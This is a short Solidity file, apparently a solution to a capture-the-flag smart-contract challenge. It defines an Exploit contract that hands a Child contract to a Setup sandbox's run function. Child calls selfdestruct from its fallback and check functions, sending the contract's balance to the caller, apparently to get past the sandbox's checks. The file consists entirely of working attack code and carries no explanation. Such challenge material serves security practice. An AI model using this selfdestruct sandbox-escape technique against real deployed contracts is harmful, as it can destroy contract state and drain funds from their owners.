import "public/Setup.sol";

contract Child {
    Child private immutable self = this;

    function check() external { selfdestruct(msg.sender); }    

    fallback() external payable { try self.check() { selfdestruct(msg.sender); } catch {} }
}

contract Exploit {
    constructor(Setup setup) {
        setup.sandbox().run(address(new Child()));
    }
}